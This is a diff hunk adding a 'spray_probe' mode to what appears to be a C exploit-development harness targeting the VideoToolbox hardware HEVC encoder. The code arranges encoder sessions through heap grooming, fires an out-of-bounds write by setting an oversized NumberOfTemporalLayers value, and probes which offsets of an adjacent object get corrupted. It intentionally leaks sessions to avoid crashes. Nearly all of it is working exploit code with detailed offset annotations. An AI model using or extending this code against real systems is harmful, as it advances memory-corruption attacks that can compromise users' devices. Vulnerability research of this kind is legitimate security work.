@@ -11970,6 +11970,181 @@ vps_cd_done:
         rlog("  Armed session leaked (not torn down)\n");
         rlog("\n=== SPRAY_WRITE complete ===\n");
 
+    } else if (strcmp(mode, "spray_probe") == 0) {
+        /*
+         * spray_probe — Progressive per-slot OOB probe into adjacent pClient
+         *
+         * Uses Loop 3 (base +0x8098) which overflows at NTL=16348.
+         * Tests NTL values from start_ntl to end_ntl, each time:
+         *   1. Create 2 filler sessions (adjacent pair)
+         *   2. Create armed session between them
+         *   3. Fire OOB write (PrepareToEncodeFrames)
+         *   4. Test adjacent filler: encode, check output, try teardown
+         *   5. Report: which offset caused what effect
+         *
+         * Loop 3 overflow into adjacent starts at NTL=16348 (offset 0x0).
+         * Each +1 NTL adds 4 bytes deeper into adjacent object.
+         *
+         * Usage: spray_probe [start_ntl] [end_ntl] [width]
+         *   start_ntl: first NTL to test (default: 16349, 4 bytes into adj)
+         *   end_ntl: last NTL to test (default: 16380, 128 bytes into adj)
+         *   width: resolution width (default: 192 → w24=15)
+         */
+        int start_ntl = (argc > 2) ? atoi(argv[2]) : 16349;
+        int end_ntl = (argc > 3) ? atoi(argv[3]) : 16380;
+        int probe_vw = (argc > 4) ? atoi(argv[4]) : 192;
+        int probe_vh = probe_vw;
+        if (start_ntl < 16349) start_ntl = 16349;
+        if (end_ntl < start_ntl) end_ntl = start_ntl;
+        if (end_ntl > 16500) end_ntl = 16500;
+        if (probe_vw < 64) probe_vw = 64;
+
+        int max_dpb = (983040 / (probe_vw * probe_vh));
+        if (max_dpb > 16) max_dpb = 16;
+        if (max_dpb < 1) max_dpb = 1;
+        int w24_val = max_dpb - 1;
+
+        rlog("=== SPRAY_PROBE: Per-slot OOB probe into adjacent pClient ===\n");
+        rlog("NTL range: %d to %d, res=%dx%d, w24=%d\n", start_ntl, end_ntl, probe_vw, probe_vh, w24_val);
+        rlog("Loop 3 overflow: NTL=16348 → adj+0x0, each +1 → +4 bytes\n");
+        rlog("Pool corruption: Loop 3 hits pool[0] at NTL=12744 (always, unavoidable)\n");
+        rlog("Armed sessions will be LEAKED to avoid pool deref crash\n\n");
+
+        for (int ntl = start_ntl; ntl <= end_ntl; ntl++) {
+            unsigned long adj_offset = 0x8098 + ((unsigned long)(ntl - 2)) * 4 - 0x18000;
+            rlog("--- NTL=%d: Loop3 writes to adj+0x%lx (%lu bytes into adjacent) ---\n",
+                 ntl, adj_offset, adj_offset + 4);
+
+            /* Create 3 sessions: filler_before, armed (in hole), filler_after */
+            VTCompressionSessionRef s_before = NULL, s_after = NULL, s_armed = NULL;
+            int ok = 1;
+
+            /* Create filler_before */
+            {
+                CFMutableDictionaryRef es = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+                CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+                OSStatus cs = VTCompressionSessionCreate(NULL, probe_vw, probe_vh,
+                    kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s_before);
+                CFRelease(es);
+                if (cs != noErr || !s_before) { rlog("  before: create FAIL\n"); ok = 0; }
+                else {
+                    VTSessionSetProperty(s_before, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+                    VTCompressionSessionPrepareToEncodeFrames(s_before);
+                }
+            }
+            /* Create filler_after (this will be adjacent to armed, the OOB target) */
+            if (ok) {
+                CFMutableDictionaryRef es = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+                CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+                OSStatus cs = VTCompressionSessionCreate(NULL, probe_vw, probe_vh,
+                    kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s_after);
+                CFRelease(es);
+                if (cs != noErr || !s_after) { rlog("  after: create FAIL\n"); ok = 0; }
+                else {
+                    VTSessionSetProperty(s_after, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+                    VTCompressionSessionPrepareToEncodeFrames(s_after);
+                }
+            }
+
+            if (!ok) {
+                if (s_before) { VTCompressionSessionInvalidate(s_before); CFRelease(s_before); }
+                if (s_after) { VTCompressionSessionInvalidate(s_after); CFRelease(s_after); }
+                rlog("  SKIP (filler creation failed)\n\n");
+                continue;
+            }
+
+            /* Verify filler_after encodes before corruption */
+            g_encode_done = 0; g_cb_status = -999; g_last_nal_size = 0;
+            {
+                CVPixelBufferRef pb = NULL;
+                CVPixelBufferCreate(NULL, probe_vw, probe_vh, kCVPixelFormatType_32BGRA, NULL, &pb);
+                if (pb) {
+                    CVPixelBufferLockBaseAddress(pb, 0);
+                    void *base = CVPixelBufferGetBaseAddress(pb);
+                    if (base) memset(base, 0x42, CVPixelBufferGetDataSize(pb));
+                    CVPixelBufferUnlockBaseAddress(pb, 0);
+                    VTCompressionSessionEncodeFrame(s_after, pb,
+                        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+                    VTCompressionSessionCompleteFrames(s_after, kCMTimePositiveInfinity);
+                    for (int w = 0; w < 100 && !g_encode_done; w++) usleep(10000);
+                    CVPixelBufferRelease(pb);
+                }
+            }
+            size_t pre_nal = g_last_nal_size;
+            int pre_cb = (int)g_cb_status;
+            rlog("  pre-corruption: cb=%d nal=%zu\n", pre_cb, pre_nal);
+
+            /* Free filler_before to create hole, then create armed in hole */
+            VTCompressionSessionInvalidate(s_before);
+            CFRelease(s_before);
+            s_before = NULL;
+
+            /* Create armed session in the hole */
+            {
+                CFMutableDictionaryRef es = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+                CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+                OSStatus cs = VTCompressionSessionCreate(NULL, probe_vw, probe_vh,
+                    kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s_armed);
+                CFRelease(es);
+                if (cs != noErr || !s_armed) {
+                    rlog("  armed: create FAIL\n");
+                    VTCompressionSessionInvalidate(s_after); CFRelease(s_after);
+                    rlog("  SKIP\n\n");
+                    continue;
+                }
+            }
+            VTSessionSetProperty(s_armed, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+            CFNumberRef ntl_n = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
+            VTSessionSetProperty(s_armed, CFSTR("NumberOfTemporalLayers"), ntl_n);
+            CFRelease(ntl_n);
+
+            /* Fire the OOB write */
+            OSStatus prep = VTCompressionSessionPrepareToEncodeFrames(s_armed);
+            rlog("  armed prepare: %d (OOB write fired)\n", (int)prep);
+
+            /* Test filler_after post-corruption: try to encode */
+            g_encode_done = 0; g_cb_status = -999; g_last_nal_size = 0;
+            {
+                CVPixelBufferRef pb = NULL;
+                CVPixelBufferCreate(NULL, probe_vw, probe_vh, kCVPixelFormatType_32BGRA, NULL, &pb);
+                if (pb) {
+                    CVPixelBufferLockBaseAddress(pb, 0);
+                    void *base = CVPixelBufferGetBaseAddress(pb);
+                    if (base) memset(base, 0x42, CVPixelBufferGetDataSize(pb));
+                    CVPixelBufferUnlockBaseAddress(pb, 0);
+                    OSStatus enc = VTCompressionSessionEncodeFrame(s_after, pb,
+                        CMTimeMake(1, 30), kCMTimeInvalid, NULL, NULL, NULL);
+                    if (enc == noErr) {
+                        VTCompressionSessionCompleteFrames(s_after, kCMTimePositiveInfinity);
+                        for (int w = 0; w < 100 && !g_encode_done; w++) usleep(10000);
+                    }
+                    CVPixelBufferRelease(pb);
+                    rlog("  post-corruption: enc=%d cb=%d nal=%zu",
+                         (int)enc, (int)g_cb_status, g_last_nal_size);
+                    if (g_last_nal_size != pre_nal) rlog(" *** NAL SIZE CHANGED ***");
+                    if (g_cb_status != pre_cb) rlog(" *** STATUS CHANGED ***");
+                    rlog("\n");
+                }
+            }
+
+            /* Teardown filler_after (should be safe — pool ptrs untouched) */
+            rlog("  teardown filler_after...");
+            VTCompressionSessionInvalidate(s_after);
+            CFRelease(s_after);
+            rlog(" OK\n");
+
+            /* Armed session leaked (pool ptrs corrupted by all 3 loops) */
+            rlog("  armed session leaked\n\n");
+            (void)s_armed; /* intentional leak */
+        }
+        rlog("\n=== SPRAY_PROBE complete ===\n");
+
     } else if (strcmp(mode, "ntl_hang_search") == 0) {
         /*
          * ntl_hang_search — Binary search the encode-hang boundary
